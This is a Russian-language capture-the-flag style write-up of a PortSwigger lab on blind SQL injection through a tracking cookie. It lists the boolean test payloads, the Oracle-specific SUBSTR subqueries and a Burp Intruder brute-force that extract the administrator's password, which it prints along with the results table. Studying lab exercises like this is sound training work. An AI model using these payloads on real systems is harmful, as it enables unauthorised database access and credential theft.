
- Эта лабораторная работа содержит уязвимость, связанную со слепым внедрением SQL. 

- Приложение использует файл cookie отслеживания для аналитики и выполняет запрос SQL, содержащий значение отправленного файла cookie.

- Результаты запроса SQL не возвращаются, и сообщения об ошибках не отображаются. Но приложение включает в себя `Welcome back` сообщение на странице, если запрос возвращает какие-либо строки.

- База данных содержит таблицу с именем `users`, со столбцами, называемыми `username` и `password`

### Задача
Использовать уязвимость слепой инъекции SQL, чтобы узнать пароль `administrator` пользователь.

----
# Разведка

1. При авторизации, мы имеем такой запрос:
```
POST /login HTTP/1.1
Host: 0adf007a049233d8809ca81100fd0079.web-security-academy.net
Cookie: TrackingId=txiOFEFLQ9pYTJPl; session=9WpoA8KZ7ldAG3sYpE2tkHZv4qBNOf9S
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://0adf007a049233d8809ca81100fd0079.web-security-academy.net
Referer: https://0adf007a049233d8809ca81100fd0079.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive

csrf=2ROFeGu9YGYNATLWlYYCMQSveFf1z7SD&username=administrator&password=123
```

С учётом вводных данных будем тестировать Cookie а именно TrackingId

2. Кидаем запрос в Reapeter и проверяем какой ответ мы получаем от сервера
- При неверном пароле без тестов вышел ответ `Invalid username or password`

==БЕЗ ' так как мы иначе нарушем логику запроса, я лоханулся тут==

3. Проверяем SQL инъекцию на простые запросы
```
' AND '1'='1 
' AND '1'='2
```
- При AND '1'='1  получили ответ Welcome back!
- При  AND '1'='2 получен ответ Invalid username or password.
Тем самым уязвимость есть!

----
# Атака 

4. Пробуем внедрить в cookie инъекцию, так как мы не имеем информации о версии бд то проверим все запросы по очереди
```
Oracle - SUBSTR('foobar', 4, 2)
Microsoft - SUBSTRING('foobar', 4, 2)
PostgreSQL - SUBSTRING('foobar', 4, 2)
MySQL - SUBSTRING('foobar', 4, 2)
```

4.1 Тест Oracle, Удачно
```
SUBSTR('foobar', 1, 1)='f
```

Тем самым база данных у нас используется **Oracle**

5. Формируем запрос на проверку таблицы users, Удачно
```
' AND (SELECT 'a' FROM users LIMIT 1)='a  
```
Подзапрос выбирает строку, содержащую символ 'a', из таблицы users. Поскольку LIMIT 1 ограничивает выборку до одной строки, этот запрос всегда будет возвращать 'a', если таблица users существует и содержит хотя бы одну запись.


6. Теперь проверяем на то что в бд есть строчка administrator, Подтвердили
```
AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

7. Уточняем количество значений в пароле (длина пароля 20 символов)
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
```
Данный запрос работает как:
- `SELECT 'a' FROM users WHERE username='administrator'` — этот подзапрос пытается извлечь строку 'a' из таблицы users, где username равен 'administrator'.

- `AND LENGTH(password)>19` — это условие добавляет фильтрацию: оно проверяет, что длина пароля для администратора больше 19 символов.

- Весь запрос объединяется с помощью AND, и если подзапрос возвращает `'a'`, то весь запрос будет истинным.

8. Подбираем пароль, для этого мы достаём пароль при помощи:
```
`AND (SELECT SUBSTR(password,chuslo,1) FROM users WHERE username='administrator')='passwd`
```
Запихиваем его в Intruder Burp Suit, используем подстановку к `passwd` брутформ а к `chuslo` Numbers до 20 c  Brute forcer и вид атаки Cluster Bomb (ток при pro версии иначе писать скрипт)
- [Подробное видио по настройке 27 минута](https://youtu.be/LBG_n9fr8sM?si=HS9C7CfaMy6udNdX)

![[Pasted image 20250119162355.png]]

|     |     |     |     |     |       |       |      |     |
| --- | --- | --- | --- | --- | ----- | ----- | ---- | --- |
| 1   | 1   | a   | 200 | 125 | false | false | 3405 |     |
| 662 | 2   | 7   | 200 | 143 | false | false | 3405 |     |
| 323 | 3   | q   | 200 | 141 | false | false | 3405 |     |
| 564 | 4   | 2   | 200 | 98  | false | false | 3405 |     |
| 645 | 5   | 6   | 200 | 136 | false | false | 3405 |     |
| 326 | 6   | q   | 200 | 148 | false | false | 3405 |     |
| 507 | 7   | z   | 200 | 103 | false | false | 3405 |     |
| 288 | 8   | o   | 200 | 138 | false | false | 3405 |     |
| 309 | 9   | p   | 200 | 109 | false | false | 3405 |     |
| 310 | 10  | p   | 200 | 138 | false | false | 3405 |     |
| 371 | 11  | s   | 200 | 98  | false | false | 3405 |     |
| 132 | 12  | g   | 200 | 99  | false | false | 3405 |     |
| 253 | 13  | m   | 200 | 143 | false | false | 3405 |     |
| 654 | 14  | 6   | 200 | 217 | false | false | 3405 |     |
| 615 | 15  | 4   | 200 | 140 | false | false | 3405 |     |
| 576 | 16  | 2   | 200 | 132 | false | false | 3405 |     |
| 117 | 17  | f   | 200 | 111 | false | false | 3405 |     |
| 458 | 18  | w   | 200 | 153 | false | false | 3405 |     |
| 139 | 19  | g   | 200 | 99  | false | false | 3405 |     |
| 40  | 20  | b   | 200 | 134 | false | false | 3405 |     |

----
# Заключение

Ник: administrator 
Пароль: a7q26qzoppsgm642fwgb
